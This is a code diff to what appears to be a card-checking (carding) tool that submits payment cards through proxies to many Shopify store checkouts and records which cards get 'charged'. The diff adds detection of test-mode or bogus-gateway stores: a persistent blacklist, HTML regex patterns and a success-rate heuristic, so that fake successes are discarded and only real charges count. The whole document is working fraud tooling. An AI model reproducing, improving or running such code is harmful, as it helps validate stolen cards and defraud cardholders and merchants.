@@ -2708,6 +2708,119 @@ PROXY_LOCK = threading.Lock()
 SITE_FILE_LOCK = threading.Lock()
 PRODUCT_CACHE_LOCK = threading.Lock()
 
+# ── Test / Fake Payment Site Detection ──────────────────────────────────
+# Sites that run bogus/test payment gateways accept ALL cards (fake charges).
+# We detect them via: (1) explicit blacklist, (2) checkout HTML indicators,
+# (3) anomalous per-site success rates (every card "charged" = test mode).
+
+TEST_SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_sites.txt")
+_TEST_SITES_SET = set()  # normalised hostnames of known test/bogus sites
+_TEST_SITES_LOCK = threading.Lock()
+
+# Per-site success-rate tracker: { normalised_url: {"attempts": int, "successes": int} }
+_SITE_SUCCESS_STATS = {}
+_SITE_STATS_LOCK = threading.Lock()
+TEST_SITE_MIN_ATTEMPTS = 3        # need at least N attempts before flagging
+TEST_SITE_SUCCESS_THRESHOLD = 1.0  # 100 % success rate => test site
+
+def _normalise_host(url_or_host: str) -> str:
+    """Return bare hostname, lowercase, no scheme/path."""
+    s = (url_or_host or "").strip().lower()
+    s = re.sub(r'^https?://', '', s)
+    s = s.split('/')[0].split('?')[0].split('#')[0]
+    return s
+
+def load_test_sites():
+    """Load known test-mode sites from test_sites.txt into memory."""
+    global _TEST_SITES_SET
+    sites = set()
+    try:
+        with open(TEST_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    sites.add(_normalise_host(line))
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        print(f"[TEST-DETECT] Error loading test_sites.txt: {e}")
+    with _TEST_SITES_LOCK:
+        _TEST_SITES_SET = sites
+    if sites:
+        print(f"[TEST-DETECT] Loaded {len(sites)} known test/bogus sites")
+
+def _add_test_site_to_file(url_or_host: str):
+    """Persist a newly-discovered test site to the blacklist file."""
+    host = _normalise_host(url_or_host)
+    with _TEST_SITES_LOCK:
+        if host in _TEST_SITES_SET:
+            return  # already known
+        _TEST_SITES_SET.add(host)
+    try:
+        with open(TEST_SITES_FILE, 'a', encoding='utf-8') as f:
+            f.write(host + '\n')
+        print(f"[TEST-DETECT] Auto-added '{host}' to test_sites.txt")
+    except Exception as e:
+        print(f"[TEST-DETECT] Could not persist test site: {e}")
+
+def is_known_test_site(url_or_host: str) -> bool:
+    """Check if a site is in the test-mode blacklist."""
+    host = _normalise_host(url_or_host)
+    with _TEST_SITES_LOCK:
+        return host in _TEST_SITES_SET
+
+# ── Checkout HTML test-mode detection patterns ──
+# Shopify stores in test/development mode embed these strings in checkout HTML.
+_TEST_MODE_PATTERNS = [
+    re.compile(r'bogus\s*gateway', re.IGNORECASE),
+    re.compile(r'test\s*mode', re.IGNORECASE),
+    re.compile(r'payments?.*\(test\s*mode\)', re.IGNORECASE),
+    re.compile(r'sandbox', re.IGNORECASE),
+    re.compile(r'"paymentGateway"\s*:\s*"bogus"', re.IGNORECASE),
+    re.compile(r'"testMode"\s*:\s*true', re.IGNORECASE),
+    re.compile(r'"is_test"\s*:\s*true', re.IGNORECASE),
+    re.compile(r'data-test-mode\s*=\s*["\']true', re.IGNORECASE),
+    re.compile(r'shopify.*payments?.*test', re.IGNORECASE),
+    re.compile(r'"provider"\s*:\s*"bogus"', re.IGNORECASE),
+]
+
+def detect_test_mode_from_html(html: str) -> bool:
+    """Scan checkout HTML for Shopify test/bogus-gateway indicators."""
+    if not html:
+        return False
+    # Only scan first 50 KB to keep it fast
+    sample = html[:50000]
+    for pat in _TEST_MODE_PATTERNS:
+        if pat.search(sample):
+            return True
+    return False
+
+def record_site_attempt(shop_url: str, was_success: bool):
+    """Track per-site success rate to detect test gateways at runtime."""
+    host = _normalise_host(shop_url)
+    with _SITE_STATS_LOCK:
+        if host not in _SITE_SUCCESS_STATS:
+            _SITE_SUCCESS_STATS[host] = {"attempts": 0, "successes": 0}
+        _SITE_SUCCESS_STATS[host]["attempts"] += 1
+        if was_success:
+            _SITE_SUCCESS_STATS[host]["successes"] += 1
+        stats = _SITE_SUCCESS_STATS[host].copy()
+    # Check if the site looks like a test gateway
+    if stats["attempts"] >= TEST_SITE_MIN_ATTEMPTS:
+        rate = stats["successes"] / stats["attempts"]
+        if rate >= TEST_SITE_SUCCESS_THRESHOLD:
+            try:
+                print(f"[TEST-DETECT] ⚠️  Site '{host}' has {stats['successes']}/{stats['attempts']} success rate "
+                      f"({rate:.0%}) — flagging as TEST/BOGUS gateway!", file=sys.__stdout__)
+            except Exception:
+                pass
+            _add_test_site_to_file(shop_url)
+            return True  # newly flagged
+    return False
+
+# Load the blacklist on import
+load_test_sites()
+
 def get_next_proxy_mapping():
     global _proxies_list, _proxy_index
     with PROXY_LOCK:
@@ -2843,6 +2956,13 @@ def step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=0):
     if '/checkouts/cn/' in final_url:
         checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
         print(f"  [OK] Checkout token: {checkout_token}")
+        
+        # ── Test-mode detection from checkout HTML ──
+        if detect_test_mode_from_html(r.text):
+            print(f"  [TEST-DETECT] ⚠️  Checkout HTML contains test/bogus gateway indicators!")
+            print(f"  [TEST-DETECT] Flagging site as TEST MODE — charges are FAKE")
+            _add_test_site_to_file(shop_url)
+            return "TEST_MODE", None, None
         
         # Debug: check if session token meta tag exists in HTML
         if 'serialized-session' in r.text.lower():
@@ -3864,6 +3984,13 @@ def process_card(idx, card, sites, site_product_cache):
         tried_sites.add(site)
         site_attempt += 1
         shop_url = normalize_shop_url(site)
+        # ── Skip known test/bogus-gateway sites ──
+        if is_known_test_site(shop_url):
+            try:
+                print(f"[TEST-DETECT] Skipping known test site: {shop_url}", file=sys.__stdout__)
+            except Exception:
+                pass
+            continue
         variant_id = None
         card_data = {**CARD_DATA, **card}
         site_label = format_site_label(shop_url)
@@ -3910,6 +4037,14 @@ def process_card(idx, card, sites, site_product_cache):
                 continue
             print(f"\n✅ Using: {title}")
             checkout_token, session_token, cookies = step1_add_to_cart_ctx(session, shop_url, variant_id)
+            # ── Test-mode detected during checkout ──
+            if checkout_token == "TEST_MODE":
+                try:
+                    print(f"\n⚠️  [TEST-DETECT] '{site_label}' uses a TEST/BOGUS payment gateway — skipping site", file=sys.__stdout__)
+                except Exception:
+                    pass
+                site_skipped = True
+                break
             if not checkout_token or not session_token:
                 print("\n[ERROR] Failed to create checkout")
                 print("[INFO] Proxy considered working (CHECKOUT_FAILED), switching to next proxy")
@@ -3951,6 +4086,8 @@ def process_card(idx, card, sites, site_product_cache):
                     code_display = '"code": "UNKNOWN"'
                 amount_display = format_amount(actual_total)
                 emit_summary_line(card_data, code_display, amount_display, time.time() - attempt_start_time, site_label)
+                # Track failed submission for test-site detection
+                record_site_attempt(shop_url, False)
 
                 try:
                     if isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT":
@@ -4024,6 +4161,16 @@ def process_card(idx, card, sites, site_product_cache):
             amount_display = format_amount(actual_total)
             emit_summary_line(card_data, code_display, amount_display, time.time() - attempt_start_time, site_label)
             if success:
+                # ── Check if this "success" is from a test gateway ──
+                newly_flagged = record_site_attempt(shop_url, True)
+                if newly_flagged or is_known_test_site(shop_url):
+                    try:
+                        print(f"\n⚠️  [TEST-DETECT] Charge on '{site_label}' is FAKE (test gateway) — ignoring result", file=sys.__stdout__)
+                    except Exception:
+                        pass
+                    worked = False  # don't count as a real charge
+                    site_skipped = True
+                    break
                 worked = True
                 try:
                     if STOP_AFTER_FIRST_RESULT:
@@ -4032,6 +4179,8 @@ def process_card(idx, card, sites, site_product_cache):
                 except Exception:
                     pass
             else:
+                # Track failed poll for test-site detection
+                record_site_attempt(shop_url, False)
                 try:
                     if is_unknown_code_display(code_display):
                         ts = int(time.time())
